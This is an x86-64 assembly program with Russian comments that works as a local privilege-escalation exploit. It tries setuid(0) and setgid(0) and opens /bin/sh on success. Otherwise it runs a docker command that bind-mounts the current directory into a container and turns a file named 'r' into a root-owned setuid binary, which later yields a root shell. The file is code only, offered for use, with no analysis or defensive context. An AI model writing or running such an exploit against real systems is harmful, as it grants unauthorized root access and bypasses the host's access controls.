.section .text
.globl _start

_start:
    # Вызываем setuid(0)
    mov $105, %rax    # syscall number for setuid
    xor %rdi, %rdi    # uid = 0
    syscall         # call syscall

    # Проверяем, успешно ли выполнен setuid
    cmp $-1, %rax     # проверяем результат
    je trying         # если не удалось, переходим к trying

    # Вызываем setgid(0)
    mov $106, %rax    # syscall number for setgid
    xor %rdi, %rdi    # gid = 0
    syscall         # call syscall

    # Проверяем, успешно ли выполнены setuid и setgid
    cmp $-1, %rax     # проверяем результат
    jne success       # если установка uid и gid прошла успешно, переходим к success

trying:
    # Если установка uid или gid не удалась
    # Выводим "trying"
    mov $1, %rax      # syscall number for write
    mov $1, %rdi      # file descriptor STDOUT
    mov $prompt_trying, %rsi # адрес строки
    mov $7, %rdx      # длина строки
    syscall         # call syscall

    # Запускаем команду через execve
    mov $59, %rax           # syscall number for execve
    lea sh, %rdi         # адрес имени файла
    lea argv, %rsi       # адрес массива аргументов
    xor %rdx, %rdx          # указываем NULL в аргументах
    syscall               # call syscall

    # выходим
    mov $60, %rax            # syscall number for exit
    xor %rdi, %rdi          # exit code 0
    syscall               # call syscall

success:
    # Установка uid и gid прошла успешно, запускаем новую оболочку
    mov $59, %rax       # syscall number for execve
    lea sh, %rdi        # адрес имени файла
    xor %rsi, %rsi      # указываем NULL в аргументах
    xor %rdx, %rdx      # указываем NULL в аргументах
    syscall           # call syscall

    # выходим
    mov $60, %rax            # syscall number for exit
    xor %rdi, %rdi          # exit code 0
    syscall               # call syscall

.section .data
prompt_trying:
    .asciz "trying\n"
c:
    .asciz "-c"
d:
    .asciz "docker run --rm -v `pwd`:/x alpine /bin/sh -c \"chown 0.0 /x/r && chmod 4777 /x/r && echo success\""
sh:
    .asciz "/bin/sh"
z:
    .asciz "\0"
argv:
    .quad sh
    .quad c
    .quad d
envp:
    .quad 0
    .align 4
